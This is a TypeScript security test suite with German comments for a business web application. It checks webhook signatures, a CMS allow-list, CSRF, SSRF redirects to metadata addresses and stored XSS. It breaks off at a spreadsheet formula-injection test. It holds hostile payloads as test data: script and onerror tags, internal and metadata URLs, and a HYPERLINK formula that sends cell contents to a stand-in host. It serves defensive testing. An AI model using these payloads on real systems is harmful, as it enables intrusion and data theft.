import { after, before, describe, it, mock } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { EventEmitter } from 'node:events';
import https from 'node:https';
import { syncBuiltinESMExports } from 'node:module';
import { PassThrough } from 'node:stream';

import ExcelJS from 'exceljs';
import Stripe from 'stripe';

import { pruefeZiel, sendeWebhook } from '../../src/lib/automation/webhook';
import { BASE_URL, data, del, get, patch, post, requireServer, sleep } from '../helpers/client';
import { ACCOUNTS, login, loginAll, type AccountName } from '../helpers/accounts';
import { eigeneOrganisationId, fremdeOrganisation, schutzfreiAufraeumen, testDb, testDbGrund, testDbSchliessen } from '../helpers/testdb';
import { PRUEF_STRIPE_GEHEIMNIS } from '../helpers/webhooks';

/**
 * Sicherheitslücken, die bis 2026-09-27 keine Prüfung hatte.
 *
 * **Warum eine eigene Datei.** Die Sicherheitsmatrix (`security/testmatrix.json`,
 * `security/sicherheitsmatrix.json`) führte für neun Klassen die Regel aus
 * `docs/SECURITY_STANDARD.md`, aber keinen Test, der sie gegen die laufende
 * Anwendung hält: den Stripe-Webhook ohne, mit falscher und mit veralteter
 * Signatur; die Freigabeliste der CMS-Bildfelder; Cookie-Attribute und
 * Herkunftsprüfung; Weiterleitungen ausgehender Webhooks; maskierte Ausgabe
 * gespeicherter Freitexte; Formelanfänge im Excel-Export; die Wiederverwendung
 * eines rotierten Erneuerungstokens; das erneute Binden einer Datei; und das
 * Lesen fremder Datensätze über ihre Kennung. Jede dieser Klassen hatte eine
 * Fachreihe in der Nähe — aber keine, die den Angriff selbst fährt.
 *
 * **Die Erwartungen folgen der Regel, nicht dem Ist-Zustand.** Wo der Code von
 * der Regel abweicht, steht hier die Regel, und der Fall scheitert, bis der
 * Code nachzieht. Ein Test, der das gegenwärtige Verhalten festschreibt, würde
 * die Lücke als Anforderung zementieren.
 *
 * **Aufräumen.** Alles, was diese Reihe anlegt, trägt die Marke
 * „Prüfreihe Sicherheitslücken" (Betreff, Titel, Notiz) oder eine Adresse unter
 * `sicherheitsluecken.<lauf>@example.ch`, und wird vorher *und* nachher
 * entfernt: Ein abgebrochener Lauf soll den nächsten nicht mit einem 409 oder
 * einem fremden Verlauf in der Liste der Kundschaft verwirren. Belege werden —
 * wie in `zahlungsbuch.test.ts` — an den Unveränderlichkeitstriggern vorbei
 * entfernt, weil eine ausgestellte Rechnung sonst stehen bliebe.
 *
 * **Keine geteilte Sitzung wird gesperrt oder widerrufen.** Die Wiederverwendung
 * eines Erneuerungstokens beendet die ganze Familie; sie läuft deshalb auf einer
 * eigenen, frischen Anmeldung, nie auf `jars.customer` aus dem Sitzungs-Cache
 * (vgl. die Falle mit `jars.employee` in `CLAUDE.md`).
 */

const MARKE = 'Prüfreihe Sicherheitslücken';
const LAUF = Date.now().toString(36);
const adresse = (teil: string) => `sicherheitsluecken.${teil}.${LAUF}@example.ch`;
const ADRESS_MUSTER = 'sicherheitsluecken.';

/** Eine Kennung, die es garantiert nicht gibt — das Gegenstück für „fremd = unbekannt". */
const UNBEKANNT = 'clzzzzzzzzzzzzzzzzzzzzzzz';

let jars: Record<AccountName, string>;
let orgId = '';

// ---------------------------------------------------------------------------
//  Hilfen
// ---------------------------------------------------------------------------

function db() {
  const client = testDb();
  assert.ok(client, `kein Zugang zur Testdatenbank: ${testDbGrund()}`);
  return client;
}

/**
 * React setzt zwischen benachbarte Textknoten `<!-- -->`. Ohne das Entfernen
 * fände eine Suche nach „Vorname Nachname" nichts, obwohl beides dasteht —
 * und eine Suche nach Markup könnte an einer Kommentargrenze vorbeigleiten.
 */
const ohneKommentare = (html: string) => html.replace(/<!--[\s\S]*?-->/g, '');

/** So maskiert React Text und Attribute (`escapeTextForBrowser`). */
const maskiert = (text: string) =>
  text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');

/**
 * Steht die Nutzlast als lebendiges Markup im ausgelieferten HTML?
 *
 * Geprüft wird der **ganze** Text, nicht nur der sichtbare Teil: Auch der
 * RSC-Datenstrom in den `<script>`-Blöcken darf die Zeichenkette nicht roh
 * tragen — Next maskiert `<` dort als `<`, und genau das soll so bleiben.
 * Dazu zwei strukturelle Muster, die unabhängig vom genauen Wortlaut greifen:
 * ein `<img>` mit `onerror` und ein `<script>` mit `alert(`.
 */
function keinLebendigesMarkup(html: string, nutzlasten: string[], wo: string) {
  const text = ohneKommentare(html);
  for (const nutzlast of nutzlasten) {
    assert.ok(!text.includes(nutzlast), `${wo}: „${nutzlast}" als Markup ausgeliefert`);
  }
  assert.ok(!/<img[^>]*\bonerror\s*=/i.test(text), `${wo}: ein <img> mit onerror steht im HTML`);
  assert.ok(!/<script[^>]*>\s*alert\(/i.test(text), `${wo}: ein <script> mit alert( steht im HTML`);
}

function refreshOnly(jar: string): string {
  return jar
    .split('; ')
    .filter((cookie) => cookie.startsWith('clenaris_rt='))
    .join('; ');
}

function mitKopf(kopf: string, fuellung = 64): Buffer {
  return Buffer.concat([Buffer.from(kopf, 'latin1'), Buffer.alloc(fuellung, 0x20)]);
}
const PDF = mitKopf('%PDF-1.7\n');

/** Ticket, Bytes, Abschluss — derselbe Weg wie in `datei-zugriff.test.ts`. */
async function hochladen(jar: string, name: string): Promise<{ id: string; url: string }> {
  const ticket = await post<{ data: { ticketId: string; signedUrl: string } }>(
    '/api/files/upload-url',
    { profile: 'document', filename: name, mimeType: 'application/pdf', sizeBytes: PDF.byteLength },
    { jar },
  );
  assert.equal(ticket.status, 201, `Ticket: ${ticket.text}`);
  const ziel = data(ticket);
  const pfad = `${BASE_URL}${new URL(ziel.signedUrl, BASE_URL).pathname}`;
  const upload = await fetch(pfad, { method: 'PUT', headers: { 'Content-Type': 'application/pdf' }, body: new Uint8Array(PDF) });
  assert.equal(upload.status, 200, 'Upload fehlgeschlagen');
  const abschluss = await post<{ data: { id: string; url: string } }>(
    '/api/files/finalize',
    { ticketId: ziel.ticketId, filename: name },
    { jar },
  );
  assert.equal(abschluss.status, 201, `Abschluss: ${abschluss.text}`);
  return { id: data(abschluss).id, url: data(abschluss).url };
}

async function eigeneKundeId(): Promise<string> {
  const kunde = await db().customer.findFirst({
    where: { organizationId: orgId, user: { email: ACCOUNTS.customer.email } },
    select: { id: true },
  });
  assert.ok(kunde, 'das Demo-Kundenkonto hat kein Kundenprofil — `npm run db:seed:demo`?');
  return kunde.id;
}

async function verlaufEroeffnen(jar: string, betreff = `${MARKE} Verlauf`, text = 'Guten Tag, eine Prüfnachricht.') {
  const r = await post<{ data: { id: string } }>('/api/messages', { subject: betreff, body: text }, { jar });
  assert.equal(r.status, 201, r.text);
  return data(r).id;
}

// ---------------------------------------------------------------------------
//  Aufräumen
// ---------------------------------------------------------------------------

/**
 * Belege, Verläufe, Akten, Zeiten und Kundschaft dieser Reihe entfernen.
 *
 * Die Reihenfolge folgt den Fremdschlüsseln: zuerst, was an Rechnungen und
 * Offerten hängt, dann die Kundschaft. Rechnungen unter `replica`, weil die
 * Trigger das Löschen einer ausgestellten Rechnung zu Recht verweigern — dort
 * greifen dann auch keine Kaskaden, also wird jede Tabelle einzeln genannt.
 */
async function aufraeumen() {
  const client = testDb();
  if (!client) return;

  // Rechnungen und Zahlungen (Zahlungsprüfung, Stripe-Fall).
  const rechnungen = await client.invoice.findMany({ where: { notes: { contains: MARKE } }, select: { id: true, customerId: true } });
  const rechnungsIds = rechnungen.map((r) => r.id);
  if (rechnungsIds.length > 0) {
    const zahlungen = await client.payment.findMany({
      where: { invoiceId: { in: rechnungsIds } },
      select: { amount: true, refundedAmount: true, status: true, customerId: true },
    });
    await schutzfreiAufraeumen(async (tx) => {
      await tx.payment.deleteMany({ where: { invoiceId: { in: rechnungsIds } } });
      await tx.creditNote.deleteMany({ where: { invoiceId: { in: rechnungsIds } } });
      await tx.paymentReminder.deleteMany({ where: { invoiceId: { in: rechnungsIds } } });
      await tx.invoiceItem.deleteMany({ where: { invoiceId: { in: rechnungsIds } } });
      await tx.invoice.deleteMany({ where: { id: { in: rechnungsIds } } });
    });
    // Eine zu Unrecht angenommene Zahlung hat den Kundenwert erhöht — zurücknehmen.
    for (const z of zahlungen) {
      const netto = Number(z.amount) - Number(z.refundedAmount);
      if (z.customerId && Math.abs(netto) > 0.001 && ['SUCCEEDED', 'PARTIALLY_REFUNDED', 'REFUNDED'].includes(z.status)) {
        await client.customer.update({ where: { id: z.customerId }, data: { lifetimeValue: { decrement: Math.round(netto * 100) / 100 } } });
      }
    }
  }

  // Verläufe (Nachrichten kaskadieren, Anhänge werden gelöst).
  await client.messageThread.deleteMany({ where: { subject: { contains: MARKE } } });

  // Führungsakten samt Fassungen.
  const akten = await client.managedDocument.findMany({ where: { title: { contains: MARKE } }, select: { id: true } });
  if (akten.length > 0) {
    const ids = akten.map((a) => a.id);
    await client.managedDocument.updateMany({ where: { id: { in: ids } }, data: { currentVersionId: null } });
    await client.documentVersion.deleteMany({ where: { documentId: { in: ids } } });
    await client.managedDocument.deleteMany({ where: { id: { in: ids } } });
  }

  // Zeiten einer fremden Person (IDOR-Fall) — ohne Einsatz, also ohne Lohnkostenwirkung.
  await client.timeEntry.deleteMany({ where: { note: { contains: MARKE } } });

  // Leads aus der Herkunftsprüfung auf dem öffentlichen Weg, falls einer durchkam.
  await client.lead.deleteMany({ where: { email: { startsWith: ADRESS_MUSTER } } });

  // Kundschaft dieser Reihe samt Offerten. Scheitert das harte Löschen an einer
  // Beziehung, die hier niemand vorhergesehen hat, bleibt der weiche Weg über
  // die Anwendung — lieber ein Eintrag im Papierkorb als ein verwaister.
  const kunden = await client.customer.findMany({ where: { email: { startsWith: ADRESS_MUSTER } }, select: { id: true } });
  for (const { id } of kunden) {
    try {
      await client.$transaction(async (tx) => {
        const offerten = await tx.quote.findMany({ where: { customerId: id }, select: { id: true } });
        await tx.quoteItem.deleteMany({ where: { quoteId: { in: offerten.map((o) => o.id) } } });
        await tx.quote.deleteMany({ where: { customerId: id } });
        await tx.address.deleteMany({ where: { customerId: id } });
        await tx.customer.delete({ where: { id } });
      });
    } catch {
      if (jars?.admin) await del(`/api/customers/${id}`, { jar: jars.admin }).catch(() => undefined);
    }
  }
}

before(async () => {
  await requireServer();
  jars = await loginAll();
  db();
  orgId = (await eigeneOrganisationId()) ?? '';
  assert.ok(orgId, 'die eigene Organisation fehlt in der Testdatenbank');
  await aufraeumen();
});

after(async () => {
  mock.restoreAll();
  syncBuiltinESMExports();
  await aufraeumen();
  await testDbSchliessen();
});

// ===========================================================================
//  1  Webhook-Signatur und Zahlungseingaben
// ===========================================================================

describe('Stripe-Webhook und Zahlungserfassung', () => {
  let rechnungId = '';
  const BRUTTO_RAPPEN = 10_810; // 2 × 50 zu 8.1 % = 108.10

  before(async () => {
    const kunde = data(await get<{ data: { id: string }[] }>('/api/customers?pageSize=1', { jar: jars.admin }))[0];
    assert.ok(kunde, 'keine Kundschaft im Bestand');
    const r = await post<{ data: { id: string } }>(
      '/api/invoices',
      { customerId: kunde.id, notes: MARKE, items: [{ name: 'Unterhaltsreinigung', quantity: 2, unit: 'Std.', unitPrice: 50, vatRate: 8.1 }], issueImmediately: true },
      { jar: jars.admin },
    );
    assert.equal(r.status, 201, r.text);
    rechnungId = data(r).id;
  });

  /** Ein Ereignis, das — gültig signiert — diese Rechnung bezahlen würde. */
  const zahlungsereignis = () =>
    JSON.stringify({
      id: `evt_sicherheit_${LAUF}_${Math.random().toString(36).slice(2, 8)}`,
      object: 'event',
      api_version: '2024-06-20',
      created: Math.floor(Date.now() / 1000),
      livemode: false,
      type: 'checkout.session.completed',
      data: {
        object: {
          id: `cs_sicherheit_${LAUF}`,
          object: 'checkout.session',
          payment_status: 'paid',
          payment_intent: `pi_sicherheit_${LAUF}_${Math.random().toString(36).slice(2, 8)}`,
          amount_total: BRUTTO_RAPPEN,
          client_reference_id: rechnungId,
          metadata: { invoiceId: rechnungId, method: 'CARD' },
        },
      },
    });

  const zustellen = (payload: string, kopf: Record<string, string>) =>
    fetch(`${BASE_URL}/api/webhooks/stripe`, { method: 'POST', headers: { 'content-type': 'application/json', ...kopf }, body: payload });

  it('ohne stripe-signature: 400, keine Zahlung', async () => {
    const antwort = await zustellen(zahlungsereignis(), {});
    assert.equal(antwort.status, 400);
    assert.equal(await db().payment.count({ where: { invoiceId: rechnungId } }), 0, 'eine unsignierte Meldung hat gebucht');
  });

  it('mit falscher Signatur (Unsinn und fremdes Geheimnis): 400, keine Zahlung', async () => {
    const payload = zahlungsereignis();
    const unsinn = await zustellen(payload, { 'stripe-signature': `t=${Math.floor(Date.now() / 1000)},v1=${'ab'.repeat(32)}` });
    assert.equal(unsinn.status, 400);

    // Formal richtig signiert — aber mit einem Geheimnis, das der Server nicht kennt.
    const fremd = Stripe.webhooks.generateTestHeaderString({ payload, secret: 'whsec_fremdes_geheimnis_der_pruefreihe' });
    assert.equal((await zustellen(payload, { 'stripe-signature': fremd })).status, 400);
    assert.equal(await db().payment.count({ where: { invoiceId: rechnungId } }), 0);
  });

  /**
   * Die Wiederholungssperre (C17: „Signatur … mit Zeitfenster"). Stripe
   * duldet fünf Minuten; zehn Minuten alt ist eine abgefangene und später
   * wieder eingespielte Meldung — mit echter Signatur, denn signiert hat sie
   * damals Stripe.
   */
  it('korrekt signiert, aber zehn Minuten alt: 400, keine Zahlung', async () => {
    const payload = zahlungsereignis();
    const signatur = Stripe.webhooks.generateTestHeaderString({
      payload,
      secret: PRUEF_STRIPE_GEHEIMNIS,
      timestamp: Math.floor(Date.now() / 1000) - 600,
    });
    const antwort = await zustellen(payload, { 'stripe-signature': signatur });
    assert.equal(antwort.status, 400);
    assert.equal(await db().payment.count({ where: { invoiceId: rechnungId } }), 0, 'eine veraltete Meldung hat gebucht');
  });

  /**
   * Zahlungserfassung im Büro: 0, negativ, Bruchteil eines Rappens und mehr
   * als offen. Die ersten drei sind Eingabefehler (Zod → 422), der vierte ist
   * eine Fachregel (C14: der Saldo ist eine Gleichung, keine Schätzung) — auch
   * 422. Eine Überzahlung liesse den Saldo negativ werden, trüge einen
   * Kundenwert ein, der nie floss, und bräuchte eine Rückerstattung, die kein
   * Weg der Anwendung kennt.
   */
  it('Betrag 0, negativ, unter einem Rappen und über dem offenen Saldo: 422, keine Zahlungszeile', async () => {
    const offen = Number((await db().invoice.findUniqueOrThrow({ where: { id: rechnungId }, select: { balance: true } })).balance);
    assert.ok(offen > 0, 'die Prüfrechnung ist nicht offen');

    for (const betrag of [0, -10, 0.001, offen + 500]) {
      const antwort = await post(`/api/invoices/${rechnungId}/payments`, { amount: betrag, method: 'BANK_TRANSFER' }, { jar: jars.admin });
      assert.equal(antwort.status, 422, `Betrag ${betrag}: HTTP ${antwort.status} ${antwort.text.slice(0, 200)}`);
    }
    assert.equal(await db().payment.count({ where: { invoiceId: rechnungId } }), 0, 'eine abgewiesene Zahlung hinterliess eine Zeile');
    const nachher = await db().invoice.findUniqueOrThrow({ where: { id: rechnungId }, select: { balance: true, paidAmount: true } });
    assert.equal(Number(nachher.balance), offen);
    assert.equal(Number(nachher.paidAmount), 0);
  });
});

// ===========================================================================
//  2  CMS-Bildfelder: nur die Freigabeliste
// ===========================================================================

describe('CMS-Bildfelder ausserhalb der Freigabeliste', () => {
  let galerieId = '';
  let vorher: { title: string; beforeUrl: string; afterUrl: string; description: string | null } | null = null;
  let adminUserId = '';

  before(async () => {
    const eintrag = await db().galleryItem.findFirst({
      where: { organizationId: orgId },
      select: { id: true, title: true, beforeUrl: true, afterUrl: true, description: true },
    });
    assert.ok(eintrag, 'kein Galerieeintrag im Bestand — `npm run db:seed:demo`?');
    galerieId = eintrag.id;
    vorher = { title: eintrag.title, beforeUrl: eintrag.beforeUrl, afterUrl: eintrag.afterUrl, description: eintrag.description };
    const admin = await db().user.findFirst({ where: { email: ACCOUNTS.admin.email }, select: { id: true } });
    assert.ok(admin);
    adminUserId = admin.id;
  });

  after(async () => {
    if (galerieId && vorher) await testDb()?.galleryItem.update({ where: { id: galerieId }, data: vorher });
  });

  /**
   * Echte Spalten, die nur nicht auf der Liste stehen — und Tabellen, die der
   * Weg nie kennen darf. `{ entity: 'user', field: 'role' }` ist genau das
   * Beispiel aus dem Kopf von `src/lib/cms/assets.ts`.
   */
  it('eine echte, aber nicht freigegebene Spalte oder Tabelle wird abgewiesen und nicht geschrieben', async () => {
    const faelle = [
      { entity: 'galleryItem', id: galerieId, field: 'title', url: '/pruef/titel-ueberschrieben.png' },
      { entity: 'galleryItem', id: galerieId, field: 'description', url: '/pruef/beschreibung.png' },
      { entity: 'user', id: adminUserId, field: 'role', url: '/SUPER_ADMIN' },
      { entity: 'user', id: adminUserId, field: 'avatarUrl', url: '/pruef/fremdes-profilbild.png' },
    ];
    for (const fall of faelle) {
      const antwort = await patch('/api/content/asset', fall, { jar: jars.admin });
      assert.ok([403, 404, 422].includes(antwort.status), `${fall.entity}.${fall.field}: HTTP ${antwort.status}`);
    }
    const nachher = await db().galleryItem.findUniqueOrThrow({ where: { id: galerieId } });
    assert.equal(nachher.title, vorher!.title);
    assert.equal(nachher.description, vorher!.description);
    const admin = await db().user.findUniqueOrThrow({ where: { id: adminUserId }, select: { role: true, avatarUrl: true } });
    assert.equal(admin.role, 'ADMIN');
    assert.notEqual(admin.avatarUrl, '/pruef/fremdes-profilbild.png');
  });

  /**
   * Namen aus der Prototypenkette. `field in table.fields` fragt auch
   * `Object.prototype` — `constructor`, `toString`, `__proto__` bestehen die
   * Prüfung, obwohl sie auf keiner Liste stehen, und landen als Spaltenname in
   * Prisma. Geschrieben wird dabei nichts (Prisma kennt die Spalte nicht),
   * aber die Freigabeliste ist in diesem Moment keine mehr: Die Antwort muss
   * eine Absage sein, kein Serverfehler aus der Tiefe der Datenbankschicht.
   */
  it('Namen aus der Prototypenkette bestehen die Freigabeliste nicht (Absage, kein 500)', async () => {
    const faelle = [
      { entity: 'galleryItem', field: 'constructor' },
      { entity: 'galleryItem', field: 'toString' },
      { entity: 'galleryItem', field: '__proto__' },
      { entity: 'constructor', field: 'name' },
      { entity: 'toString', field: 'length' },
      { entity: '__proto__', field: 'hasOwnProperty' },
    ];
    for (const fall of faelle) {
      const antwort = await patch('/api/content/asset', { ...fall, id: galerieId, url: '/pruef/prototyp.png' }, { jar: jars.admin });
      assert.ok(
        [403, 404, 422].includes(antwort.status),
        `${fall.entity}.${fall.field}: HTTP ${antwort.status} — die Freigabeliste liess einen Prototypnamen durch`,
      );
    }
    const nachher = await db().galleryItem.findUniqueOrThrow({ where: { id: galerieId } });
    assert.equal(nachher.beforeUrl, vorher!.beforeUrl);
    assert.equal(nachher.afterUrl, vorher!.afterUrl);
  });

  it('Gegenprobe: ein freigegebenes Feld mit unverändertem Wert antwortet 200', async () => {
    const antwort = await patch(
      '/api/content/asset',
      { entity: 'galleryItem', id: galerieId, field: 'beforeUrl', url: vorher!.beforeUrl },
      { jar: jars.admin },
    );
    assert.equal(antwort.status, 200, antwort.text);
  });
});

// ===========================================================================
//  3  CSRF: Cookie-Attribute und Herkunft
// ===========================================================================

describe('CSRF — Sitzungscookies und Herkunftsprüfung', () => {
  it('clenaris_at und clenaris_rt sind HttpOnly und SameSite=Lax oder Strict', async () => {
    const frisch = await login(ACCOUNTS.customer.email, ACCOUNTS.customer.password);
    assert.equal(frisch.status, 200, frisch.text);
    const gesetzt = frisch.headers.getSetCookie?.() ?? [];
    for (const name of ['clenaris_at', 'clenaris_rt']) {
      const cookie = gesetzt.find((c) => c.startsWith(`${name}=`));
      assert.ok(cookie, `${name} wurde bei der Anmeldung nicht gesetzt`);
      assert.match(cookie, /;\s*HttpOnly/i, `${name} ist per Skript lesbar`);
      const sameSite = /;\s*SameSite=(\w+)/i.exec(cookie)?.[1] ?? '';
      assert.ok(/^(lax|strict)$/i.test(sameSite), `${name}: SameSite=${sameSite || '(fehlt)'}`);
      // `Secure` verlangt C7 „ausser lokal" — geprüft nur, wo die Reihe über https fährt.
      if (BASE_URL.startsWith('https:')) assert.match(cookie, /;\s*Secure/i, `${name} ohne Secure über https`);
    }
  });

  /**
   * Eine fremde Herkunft, `null` (Sandbox-Rahmen) und ein Host, der den
   * eigenen nur als Präfix trägt — alle drei sind fremd. Geprüft wird
   * zusätzlich, dass **nichts entstand**: Ein 403, nachdem der Verlauf schon
   * angelegt war, wäre keine Abwehr.
   */
  it('POST mit fremdem Origin: 403, und nichts wird angelegt', async () => {
    const eigenerHost = new URL(BASE_URL).host;
    const herkuenfte = ['https://angreifer.pruef.example', 'null', `http://${eigenerHost}.angreifer.pruef.example`];
    for (const origin of herkuenfte) {
      const antwort = await post(
        '/api/messages',
        { subject: `${MARKE} fremde Herkunft`, body: 'Diese Nachricht darf nicht entstehen.' },
        { jar: jars.customer, headers: { origin } },
      );
      assert.equal(antwort.status, 403, `Origin ${origin}: HTTP ${antwort.status}`);
    }
    assert.equal(await db().messageThread.count({ where: { subject: `${MARKE} fremde Herkunft` } }), 0);
  });

  it('PATCH und öffentlicher POST mit fremdem Origin: 403, ohne Wirkung', async () => {
    const eintrag = await db().galleryItem.findFirst({ where: { organizationId: orgId }, select: { id: true, beforeUrl: true } });
    assert.ok(eintrag);
    const bild = await patch(
      '/api/content/asset',
      { entity: 'galleryItem', id: eintrag.id, field: 'beforeUrl', url: '/pruef/csrf-untergeschoben.png' },
      { jar: jars.admin, headers: { origin: 'https://angreifer.pruef.example' } },
    );
    assert.equal(bild.status, 403);
    assert.equal((await db().galleryItem.findUniqueOrThrow({ where: { id: eintrag.id } })).beforeUrl, eintrag.beforeUrl);

    // `definePublicRoute` läuft durch dieselbe Prüfung — ohne Sitzung gibt es
    // zwar kein Cookie zu missbrauchen, aber ein fremdes Formular soll auch
    // keine Anfragen in die Verwaltung schreiben.
    const email = adresse('kontakt');
    const kontakt = await post(
      '/api/public/contact',
      { firstName: 'Fremd', lastName: 'Herkunft', email, message: 'Anfrage aus einem fremden Formular.', acceptPrivacy: true, website: '' },
      { headers: { origin: 'https://angreifer.pruef.example' } },
    );
    assert.equal(kontakt.status, 403);
    assert.equal(await db().lead.count({ where: { email } }), 0);
  });

  /**
   * Ohne `Origin` und ohne `Referer`: Die Regel (C7 in
   * `docs/SECURITY_STANDARD.md`, Kopf von `assertTrustedOrigin` in
   * `src/lib/api/handler.ts`) verlangt **keine** Abweisung. Begründung dort:
   * Jeder aktuelle Browser schickt bei `POST`, `PATCH`, `PUT` und `DELETE`
   * den `Origin`-Kopf mit; ohne ihn fragt ein Nicht-Browser-Klient (Cron,
   * Webhook, `curl`, diese Reihe), der kein fremdgesteuertes Cookie trägt. Die
   * erste Linie bleibt `SameSite=Lax` (Fall oben). Dieser Fall hält die
   * dokumentierte Regel fest, damit eine stille Änderung in die eine oder
   * andere Richtung auffällt.
   */
  it('POST ohne Origin und Referer läuft nach dokumentierter Regel durch (SameSite trägt)', async () => {
    const antwort = await post(
      '/api/messages',
      { subject: `${MARKE} ohne Herkunft`, body: 'Nachricht eines Klienten ohne Origin.' },
      { jar: jars.customer },
    );
    assert.equal(antwort.status, 201, antwort.text);
  });
});

// ===========================================================================
//  4  SSRF: keine Weiterleitung ausgehender Webhooks
// ===========================================================================

/**
 * Direkt importiert, aus dem Grund, den `automatisierungen.test.ts` nennt:
 * Über HTTP müsste der Server eine interne Adresse tatsächlich anrufen, um zu
 * zeigen, dass er es nicht tut. Hier wird `https.request` durch eine
 * Gegenstelle ersetzt, die mit einer Weiterleitung auf den Metadatendienst
 * antwortet — und gezählt, wie viele Anfragen der Aufruf auslöst.
 *
 * `mock.method` ersetzt die Eigenschaft am Modulobjekt; `syncBuiltinESMExports`
 * zieht die benannten ESM-Bindungen nach. Damit greift der Ersatz, gleich ob
 * `tsx` die Datei als CommonJS oder als ESM lädt.
 */
describe('SSRF — Weiterleitungen eines Automations-Webhooks', () => {
  const ZIEL = 'https://gegenstelle.pruef.example/hook';
  const oeffentlich = async () => [{ address: '93.184.215.14', family: 4 }];

  for (const [status, ort] of [
    [301, 'https://169.254.169.254/latest/meta-data/'],
    [302, 'https://127.0.0.1:5432/'],
    [303, 'http://10.0.0.5/admin'],
    [307, 'https://[::1]/'],
    [308, 'https://metadata.google.internal/computeMetadata/v1/'],
  ] as const) {
    it(`${status} nach ${ort} wird nicht verfolgt — genau eine Anfrage, Ergebnis ein Fehlschlag`, async () => {
      const aufrufe: { url: string; lookup: unknown }[] = [];
      mock.method(https, 'request', ((url: unknown, optionen: { lookup?: unknown }, rueckruf: (antwort: unknown) => void) => {
        aufrufe.push({ url: String(url), lookup: optionen?.lookup });
        const anfrage = new EventEmitter() as EventEmitter & { end: (rumpf?: unknown) => void; destroy: () => void };
        anfrage.destroy = () => undefined;
        anfrage.end = () => {
          setImmediate(() => {
            const antwort = Object.assign(new PassThrough(), { statusCode: status, headers: { location: ort } });
            rueckruf(antwort);
            antwort.end();
          });
        };
        return anfrage;
      }) as unknown as typeof https.request);
      syncBuiltinESMExports();

      try {
        const ergebnis = await sendeWebhook({ url: ZIEL, rumpf: { pruefung: true }, secret: 'pruef', aufloesen: oeffentlich });
        assert.equal(aufrufe.length, 1, `der Weiterleitung wurde gefolgt: ${JSON.stringify(aufrufe.map((a) => a.url))}`);
        assert.equal(aufrufe[0]!.url, ZIEL);
        assert.equal(typeof aufrufe[0]!.lookup, 'function', 'die Verbindung löst nicht über die prüfende Auflösung auf');
        assert.equal(ergebnis.ok, false, 'eine Weiterleitung gilt als Erfolg');
        assert.equal(ergebnis.status, status);
        assert.equal(ergebnis.fehler, 'STATUS');
      } finally {
        mock.restoreAll();
        syncBuiltinESMExports();
      }

      // Und selbst als eigenes Ziel wäre die Adresse der Weiterleitung abgewiesen
      // worden — die Weiterleitung ist also genau der Umweg, der gesperrt sein muss.
      const direkt = await pruefeZiel(ort, async () => [{ address: '169.254.169.254', family: 4 }]);
      assert.equal(direkt.ok, false, `${ort} wäre als direktes Ziel erlaubt`);
    });
  }
});

// ===========================================================================
//  5  XSS: gespeicherter Freitext bleibt Text
// ===========================================================================

describe('XSS — gespeicherte Freitexte im ausgelieferten HTML', () => {
  const SKRIPT = '<script>alert(1)</script>';
  const BILD = '<img src=x onerror=alert(1)>';
  let kundeId = '';
  let offerteId = '';
  let verlaufId = '';

  before(async () => {
    const kunde = await post<{ data: { id: string } }>(
      '/api/customers',
      {
        type: 'PRIVATE',
        firstName: BILD,
        lastName: SKRIPT,
        email: adresse('xss'),
        language: 'DE',
        notes: `${MARKE}: ${BILD}`,
        paymentTermDays: 30,
        discountPercent: 0,
        taxExempt: false,
        tagIds: [],
        createLogin: false,
      },
      { jar: jars.admin },
    );
    assert.equal(kunde.status, 201, kunde.text);
    kundeId = data(kunde).id;

    const offerte = await post<{ data: { id: string } }>(
      '/api/quotes',
      {
        customerId: kundeId,
        title: `${MARKE} ${SKRIPT}`,
        validUntil: new Date(Date.now() + 30 * 864e5).toISOString().slice(0, 10),
        items: [{ name: BILD, description: SKRIPT, quantity: 1, unit: 'Std.', unitPrice: 50, discount: 0, vatRate: 8.1, optional: false }],
        discountValue: 0,
      },
      { jar: jars.admin },
    );
    assert.equal(offerte.status, 201, offerte.text);
    offerteId = data(offerte).id;

    verlaufId = await verlaufEroeffnen(jars.customer, `${MARKE} ${BILD}`, `Nachricht mit ${SKRIPT} und ${BILD}`);
  });

  it('Kundendetail: Name und Notiz erscheinen maskiert, nie als Markup', async () => {
    const seite = await get(`/admin/kunden/${kundeId}`, { jar: jars.admin });
    assert.equal(seite.status, 200);
    keinLebendigesMarkup(seite.text, [SKRIPT, BILD], '/admin/kunden/[id]');
    const text = ohneKommentare(seite.text);
    assert.ok(text.includes(maskiert(BILD)), 'der Vorname steht nicht (maskiert) auf der Seite — die Prüfung sähe sonst ins Leere');
    assert.ok(text.includes(maskiert(SKRIPT)), 'der Nachname steht nicht (maskiert) auf der Seite');
  });

  it('Offertdetail: Position und Titel erscheinen maskiert, nie als Markup', async () => {
    const seite = await get(`/admin/offerten/${offerteId}`, { jar: jars.admin });
    assert.equal(seite.status, 200);
    keinLebendigesMarkup(seite.text, [SKRIPT, BILD], '/admin/offerten/[id]');
    assert.ok(ohneKommentare(seite.text).includes(maskiert(BILD)), 'die Position steht nicht (maskiert) auf der Seite');
  });

  /**
   * Der Posteingang lädt Verläufe im Browser (`ThreadList`, React Query) —
   * das HTML des Servers trägt den Nachrichtentext gar nicht. Geprüft wird
   * deshalb beides, was über HTTP sichtbar ist: Die Seite liefert kein Markup
   * aus, und der Endpunkt, aus dem sie liest, antwortet als JSON mit `nosniff`,
   * sodass auch ein direkt geöffneter Link nie als HTML gedeutet wird. Dass
   * React den Text im Browser als Text setzt, beweist nur ein Browsertest.
   */
  it('Nachrichten: Seite ohne Markup, Endpunkt als JSON mit nosniff und Text unverändert', async () => {
    for (const pfad of [`/admin/nachrichten?verlauf=${verlaufId}`, '/admin', `/admin/kunden/${kundeId}`]) {
      const seite = await get(pfad, { jar: jars.admin });
      assert.equal(seite.status, 200, pfad);
      keinLebendigesMarkup(seite.text, [SKRIPT, BILD], pfad);
    }
    const verlauf = await get<{ data: { subject: string; messages: { body: string }[] } }>(`/api/messages/${verlaufId}`, { jar: jars.admin });
    assert.equal(verlauf.status, 200);
    assert.match(verlauf.headers.get('content-type') ?? '', /^application\/json/);
    assert.equal(verlauf.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(data(verlauf).messages[0]?.body, `Nachricht mit ${SKRIPT} und ${BILD}`);
  });
});

// ===========================================================================
//  6  Formelinjektion im Excel-Export
// ===========================================================================

describe('Formelinjektion — Excel-Export der Kundschaft', () => {
  const FORMEL = '=HYPERLINK("https://boese.pruef.invalid/?"&A1,"Beleg")';
